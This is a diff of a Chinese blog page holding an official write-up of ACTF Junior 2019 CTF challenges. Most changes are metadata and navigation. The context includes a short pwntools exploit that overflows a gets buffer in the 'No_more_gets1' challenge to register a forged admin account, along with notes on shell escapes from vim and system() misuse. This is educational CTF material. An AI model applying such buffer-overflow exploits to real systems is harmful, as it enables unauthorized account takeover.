@@ -124,10 +124,12 @@
 <meta property="og:site_name" content="LuckyDog">
 <meta property="og:description" content="日常出锅、、、">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-02-28T07:57:17.421Z">
+<meta property="og:image" content="http://csuwangj.github.io/ACTF-Junior-2019-Official-WriteUP-of-CSUWangj-s-Challenge/test.png">
+<meta property="og:updated_time" content="2019-02-28T08:39:37.267Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ACTF Junior 2019 Official WriteUP of CSUWangj&#39;s Challenge">
 <meta name="twitter:description" content="日常出锅、、、">
+<meta name="twitter:image" content="http://csuwangj.github.io/ACTF-Junior-2019-Official-WriteUP-of-CSUWangj-s-Challenge/test.png">
 
 
 
@@ -392,7 +394,7 @@
                 
               
 
-              <time title="创建时间：2019-02-28 15:55:24 / 修改时间：15:57:17" itemprop="dateCreated datePublished" datetime="2019-02-28T15:55:24+08:00">2019-02-28</time>
+              <time title="创建时间：2019-02-28 15:55:24 / 修改时间：16:39:37" itemprop="dateCreated datePublished" datetime="2019-02-28T15:55:24+08:00">2019-02-28</time>
             
 
             
@@ -494,10 +496,10 @@
 <p>然后vim在普通模式下是可以执行Linux命令的，然后就可以ls, cat flag之类的了。</p>
 <p>感谢各位没有把容器玩坏。</p>
 <h2 id="No-more-gets1"><a href="#No-more-gets1" class="headerlink" title="No_more_gets1"></a>No_more_gets1</h2><p>查看<a href="https://github.com/CSUwangj/ACTF_Junior_2019/blob/master/Linux%26PWN/No_more_gets2/src/src.c" target="_blank" rel="noopener">源码</a>，问题出在<a href="https://github.com/CSUwangj/ACTF_Junior_2019/blob/master/Linux%26PWN/No_more_gets1/src/src.c#L140" target="_blank" rel="noopener">第140行（rigist()+12）</a>，passwdbuf在namebuf前面，所以gets的时候可以把namebuf覆盖掉，于是就能强行注册一个密码自己设定的admin。</p>
-<p>一个可用exp（来自给力的学弟）如下：</p>
+<p>一个可用的exp（来自给力的学弟）如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">    sh = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(<span class="string">"./a.out"</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="number">0x10</span> * <span class="string">'a'</span> + p64(<span class="number">0x0</span>) + p64(<span class="number">0x555555555607</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"6) Exit"</span>)</span><br><span class="line">sh.sendline(<span class="string">"3"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.recvuntil(<span class="string">"Input your name"</span>)</span><br><span class="line">sh.sendline(<span class="string">'father'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Input your password'</span>)</span><br><span class="line">sh.sendline(<span class="string">'aaaaaaaaaaaaaaa\0admin\0'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"6) Exit"</span>)</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.sendline(<span class="string">'admin'</span>)</span><br><span class="line">sh.sendline(<span class="string">'aaaaaaaaaaaaaaa'</span>)</span><br><span class="line">sh.sendline(<span class="string">'4'</span>)</span><br><span class="line"><span class="keyword">print</span> sh.recvuntil(<span class="string">'&#125;'</span>)</span><br><span class="line">sh.sendline(<span class="string">'6'</span>)</span><br></pre></td></tr></table></figure>
 <h2 id="Special-Shell"><a href="#Special-Shell" class="headerlink" title="Special_Shell"></a>Special_Shell</h2><p>这个题是HGAME2018里看到的，感觉很有意思，YTB上有更详细的视频。</p>
-<p><a href=""><strong>源码</strong></a></p>
+<p><a href="https://github.com/CSUAuroraLab/ACTF_Junior_2019/blob/master/Linux%26PWN/Special_Shell/src/src.c" target="_blank" rel="noopener"><strong>源码</strong></a></p>
 <p>有两个预期解，一方面来说，假如去阅读system()的<a href="https://linux.die.net/man/3/system" target="_blank" rel="noopener">手册</a>会看到</p>
 <blockquote>
 <p>Do not use <strong>system</strong>() from a program with set-user-ID or set-group-ID privileges, because strange values for some environment variables might be used to subvert system integrity. Use the <strong>*exec</strong>(3)<em> family of functions instead, but not **</em>execlp<strong>(3)<em> or </em></strong>execvp*<em>(3)</em>.</p>
@@ -513,6 +515,7 @@
 <p>算了，心累，这题提交失败超过20次的，线下逮到出题人请吃饭。。。</p>
 <h2 id="矾书"><a href="#矾书" class="headerlink" title="矾书"></a>矾书</h2><p>就是把字符画的主体换成了白色字体保存成PDF。</p>
 <p>大家还是很机灵的，顺便如果有个正好符合需求的PDF浏览器，这个题会解决得很快。</p>
+<img src="/ACTF-Junior-2019-Official-WriteUP-of-CSUWangj-s-Challenge/test.png">
 <h2 id="反切码"><a href="#反切码" class="headerlink" title="反切码"></a>反切码</h2><p>这里我偷了懒，并没有深入地考察这个东西、、、只需要百度就能找到出处，因为古音有八个读音，而现在只有四个，所以特地注明了一下用普通话来读。</p>
 <p>（其实当时想吃的是火锅，但是缺声母来着）</p>
 <h2 id="Tiny-RSA"><a href="#Tiny-RSA" class="headerlink" title="Tiny RSA"></a>Tiny RSA</h2><p>就是一个非常非常naive的RSA，简易到可以用手算，希望大家对将要到来的<strong>段老师</strong>教授的密码学有所期待，段老师真的超好！</p>
@@ -538,6 +541,7 @@
 <p>EXP没什么好放的吧，就跑跑暴力的事情。</p>
 <h2 id="Non-cryptography-Hash"><a href="#Non-cryptography-Hash" class="headerlink" title="Non-cryptography Hash"></a>Non-cryptography Hash</h2><p>这个题是看起来难的其实一点也不难的题，因为它的值域一共就、、、那么多、、、</p>
 <p>所以，不管是直接暴力，还是暴力建表然后查找，理论上都是可行的、、、</p>
+<h2 id="点击英雄1存档修改"><a href="#点击英雄1存档修改" class="headerlink" title="点击英雄1存档修改"></a>点击英雄1存档修改</h2><p>这个就不说了吧，也没有人问我，看起来都不想放弃游戏体验呢</p>
 <h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><p>这部分题目我个人感觉解法是很多的，在我的认知里取证和渗透类似，不同的人不同的工具都会有不同的效果，而且可能都可以达成目的，这里的解答仅作参考，如果有什么特别的解法请<a href="mailto:CSUwangj@protonmail.com" target="_blank" rel="noopener">告知我</a>，万分感激。</p>
 <p>顺便这几个题对flag的字符串都没有做什么隐藏，所以除了一个人以外都是strings/脱壳后strings解出来的，令出题人感到非常伤心，这根本不好玩嘛</p>
 <h2 id="Popbox"><a href="#Popbox" class="headerlink" title="Popbox"></a>Popbox</h2><p>重定向输出流即可，cmd下可以直接&gt;，powershell需要用Out-File。</p>
@@ -562,19 +566,19 @@
   
     <li class="popular-posts-item">
       
-        <div class="popular-posts-date">2018-02-08</div>
+        <div class="popular-posts-date">2018-05-10</div>
       
       
-      <div class="popular-posts-title"><a href="/HGAME2018-week1WP/" rel="bookmark">HGAME2018-week1WP</a></div>
+      <div class="popular-posts-title"><a href="/JarvisOJ-WP合集/" rel="bookmark">JarvisOJ-WP合集</a></div>
       
     </li>
   
     <li class="popular-posts-item">
       
-        <div class="popular-posts-date">2018-05-10</div>
+        <div class="popular-posts-date">2018-02-08</div>
       
       
-      <div class="popular-posts-title"><a href="/JarvisOJ-WP合集/" rel="bookmark">JarvisOJ-WP合集</a></div>
+      <div class="popular-posts-title"><a href="/HGAME2018-week1WP/" rel="bookmark">HGAME2018-week1WP</a></div>
       
     </li>
   
@@ -713,8 +717,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/博文整理/" rel="prev" title="博文整理">
-                博文整理 <i class="fa fa-chevron-right"></i>
+              <a href="/2019-03-01-Daily-Challenge/" rel="prev" title="2019-03-01 Daily Challenge">
+                2019-03-01 Daily Challenge <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -803,7 +807,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">95</span>
+                    <span class="site-state-item-count">96</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -1042,7 +1046,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux-amp-PWN"><span class="nav-number">1.</span> <span class="nav-text">Linux&amp;PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#vim"><span class="nav-number">1.1.</span> <span class="nav-text">vim</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#No-more-gets1"><span class="nav-number">1.2.</span> <span class="nav-text">No_more_gets1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Special-Shell"><span class="nav-number">1.3.</span> <span class="nav-text">Special_Shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#No-more-gets2"><span class="nav-number">1.4.</span> <span class="nav-text">No_more_gets2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-number">2.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#casear"><span class="nav-number">2.1.</span> <span class="nav-text">casear</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#矾书"><span class="nav-number">2.2.</span> <span class="nav-text">矾书</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反切码"><span class="nav-number">2.3.</span> <span class="nav-text">反切码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tiny-RSA"><span class="nav-number">2.4.</span> <span class="nav-text">Tiny RSA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#So-called-ECB"><span class="nav-number">2.5.</span> <span class="nav-text">So called ECB</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Broken-Random"><span class="nav-number">2.6.</span> <span class="nav-text">Broken Random</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RSA-Lab"><span class="nav-number">2.7.</span> <span class="nav-text">RSA Lab</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HappyBirthday"><span class="nav-number">2.8.</span> <span class="nav-text">HappyBirthday</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Non-cryptography-Hash"><span class="nav-number">2.9.</span> <span class="nav-text">Non-cryptography Hash</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Forensics"><span class="nav-number">3.</span> <span class="nav-text">Forensics</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Popbox"><span class="nav-number">3.1.</span> <span class="nav-text">Popbox</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DoNothing"><span class="nav-number">3.2.</span> <span class="nav-text">DoNothing</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Memory"><span class="nav-number">3.3.</span> <span class="nav-text">Memory</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WireFish"><span class="nav-number">3.4.</span> <span class="nav-text">WireFish</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux-amp-PWN"><span class="nav-number">1.</span> <span class="nav-text">Linux&amp;PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#vim"><span class="nav-number">1.1.</span> <span class="nav-text">vim</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#No-more-gets1"><span class="nav-number">1.2.</span> <span class="nav-text">No_more_gets1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Special-Shell"><span class="nav-number">1.3.</span> <span class="nav-text">Special_Shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#No-more-gets2"><span class="nav-number">1.4.</span> <span class="nav-text">No_more_gets2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-number">2.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#casear"><span class="nav-number">2.1.</span> <span class="nav-text">casear</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#矾书"><span class="nav-number">2.2.</span> <span class="nav-text">矾书</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反切码"><span class="nav-number">2.3.</span> <span class="nav-text">反切码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tiny-RSA"><span class="nav-number">2.4.</span> <span class="nav-text">Tiny RSA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#So-called-ECB"><span class="nav-number">2.5.</span> <span class="nav-text">So called ECB</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Broken-Random"><span class="nav-number">2.6.</span> <span class="nav-text">Broken Random</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RSA-Lab"><span class="nav-number">2.7.</span> <span class="nav-text">RSA Lab</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HappyBirthday"><span class="nav-number">2.8.</span> <span class="nav-text">HappyBirthday</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Non-cryptography-Hash"><span class="nav-number">2.9.</span> <span class="nav-text">Non-cryptography Hash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#点击英雄1存档修改"><span class="nav-number">2.10.</span> <span class="nav-text">点击英雄1存档修改</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Forensics"><span class="nav-number">3.</span> <span class="nav-text">Forensics</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Popbox"><span class="nav-number">3.1.</span> <span class="nav-text">Popbox</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DoNothing"><span class="nav-number">3.2.</span> <span class="nav-text">DoNothing</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Memory"><span class="nav-number">3.3.</span> <span class="nav-text">Memory</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WireFish"><span class="nav-number">3.4.</span> <span class="nav-text">WireFish</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -1081,7 +1085,7 @@
     
       <span class="post-meta-item-text">站点总字数：</span>
     
-    <span title="站点总字数">403k</span>
+    <span title="站点总字数">404k</span>
   
 
   
@@ -1092,7 +1096,7 @@
     
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
     
-    <span title="站点阅读时长">11:11</span>
+    <span title="站点阅读时长">11:13</span>
   
 </div>
 
